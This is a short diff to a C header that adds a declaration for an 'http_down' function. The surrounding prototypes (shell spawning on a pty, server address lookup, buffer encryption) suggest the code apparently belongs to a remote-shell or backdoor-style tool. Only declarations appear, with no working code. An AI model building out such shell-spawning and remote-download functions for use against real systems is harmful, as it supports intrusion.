@@ -12,6 +12,8 @@ int pty_main(int, char *[]);
 int startshell(int*, int*);
 int get_servaddr(char *, short *);
 
+int http_down(char *, char *);
+
 void encrypt_buf(char *, size_t);
 void decrypt_buf(char *, size_t);
 
